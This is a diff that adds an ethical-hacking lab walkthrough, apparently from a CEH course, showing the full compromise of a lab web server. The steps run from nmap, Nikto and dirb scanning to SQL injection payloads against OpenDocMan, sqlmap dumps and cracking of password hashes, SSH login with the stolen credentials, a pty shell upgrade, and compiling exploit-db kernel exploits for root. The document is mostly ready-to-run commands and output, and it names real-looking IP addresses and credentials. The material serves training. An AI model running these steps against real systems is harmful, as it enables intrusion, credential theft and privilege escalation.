@@ -1,0 +1,238 @@
+Use Putty to SSH into my Ubuntu host in order to perform the lab tasks below.
+
+You can download Putty from here:
+http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+
+
+IP Address: 	45.76.254.222
+Protocol:	        ssh
+Port:		        22
+username:	        ceh
+password:	        
+
+
+Attack steps:
+-------------
+ 
+ 
+ 
+Step 1: Ping sweep the target network
+-------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+nmap -sP 172.31.2.0/24
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Found 3 hosts
+172.31.2.64
+172.31.2.217
+172.31.2.238
+ 
+ 
+ 
+Step 2: Port scan target system
+-------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+nmap -sV 172.31.2.64
+-----------------------------------------------------------------------
+ 
+ 
+ 
+-------------Scan Results--------------------------------------------
+PORT     STATE    SERVICE VERSION
+22/tcp   open     ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+80/tcp   open     http    Apache httpd 2.4.7 ((Ubuntu))
+514/tcp  filtered shell
+1037/tcp filtered ams
+6667/tcp open     irc     ngircd
+Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+--------------------------------------------------------------------
+ 
+ 
+Step 3: Vulnerability Scan the webserver
+----------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+cd ~/toolz/Nikto2/program
+ 
+perl nikto.pl -h 172.31.2.64
+-----------------------------------------------------------------------
+ 
+ 
+Step 4: Run dirbuster or similar directory bruteforce tool against the target
+-----------------------------------------------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+cd ~/toolz/dirb/
+ 
+ 
+./dirb http://172.31.2.64 wordlists/big.txt
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Step 5: Browse the web site to look for clues
+---------------------------------------------
+To connect to the VPN open a web browser on your host machine (not your virtual machine) and go to the following URL:
+https://54.245.178.32/?src=connect
+
+Accept the security exception and enter one of the following user names:
+ 
+username: labuser001      
+username: labuser002
+username: labuser003
+username: labuser004
+username: labuser005
+username: labuser006
+username: labuser007
+username: labuser008
+username: labuser009
+username: labuser010
+username: labuser011
+username: labuser012
+username: labuser013
+username: labuser014
+username: labuser015
+username: labuser016
+username: labuser017
+username: labuser018
+username: labuser019
+username: labuser020
+
+
+ 
+Since no glaring vulnerabilities were found with the scanner - we start just looking around the website itself
+
+
+..... really didn't get much from here so we just opened the web page in a browser
+http://172.31.2.64/
+ 
+.....browsed to the webpage and saw that it pointed to:
+http://172.31.2.64/jabc
+ 
+....clicked on documentation link and found hidden text that pointed to here:
+http://172.31.2.64/jabcd0cs/
+ 
+....saw that the app was OpenDocMan v1.2.7 and found it was vulnerable:
+https://www.exploit-db.com/exploits/32075/
+ 
+Tried the sql injection described in exploit-db:
+http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user UNION SELECT 1,version(),3,4,5,6,7,8,9
+ 
+http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user UNION SELECT 1,user(),3,4,5,6,7,8,9
+ 
+ 
+ 
+Tried to run sqlmap against the target
+ 
+ 
+---------------------------Type This-----------------------------------
+cd ~/toolz/sqlmap-dev/
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -b --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --current-user --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --current-db --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --dbs --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --users --passwords --dbms=mysql
+-----------------------------------------------------------------------
+ 
+ 
+ 
+FOUND: cracked password 'toor' for user 'drupal7' (sqlmap)
+FOUND: 9CFBBC772F3F6C106020035386DA5BBBF1249A11 hash is 'toor' verified at crackstation.net
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -D jabcd0cs --tables --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -D jabcd0cs -T odm_user --dump --dbms=mysql
+-----------------------------------------------------------------------
+ 
+    username:   webmin
+    hash:       b78aae356709f8c31118ea613980954b
+ 
+https://hashkiller.co.uk/md5-decrypter.aspx
+   
+    hash:       b78aae356709f8c31118ea613980954b
+    pass:       webmin1980
+ 
+ 
+ok - /phpmyadmin and /webmin both did not work in the browser but these credentials worked for SSH.
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ssh -l webmin 172.31.2.64
+    webmin1980
+ 
+id
+ 
+cat /etc/*release
+-----------------------------------------------------------------------
+ 
+ 
+ 
+....tired of not having a real command shell...
+ 
+ 
+---------------------------Type This-----------------------------------
+python -c 'import pty;pty.spawn("/bin/bash")'
+ 
+ 
+cd /tmp
+ 
+pwd
+ 
+ 
+cat >> exploit.c << out
+ 
+**************paste in the content from here *****************
+https://www.exploit-db.com/raw/39166/
+ 
+ 
+------ hit enter a few times ------
+ 
+------ then type 'out' ----- this closes the file handle...
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+gcc -o boom exploit.c
+ 
+./boom
+-----------------------------------------------------------------------
+ 
+ 
+------------exploit failed, damn let's try another one ---------
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+cat >> exploit2.c << out
+ 
+**************paste in the content from here *****************
+https://www.exploit-db.com/raw/37292/
+ 
+ 
+out
+ 
+ 
+gcc -o boom2 exploit2.c
+ 
+./boom2
+ 
+id
+ 
+ 
+......YEAH - do the happy dance!!!!
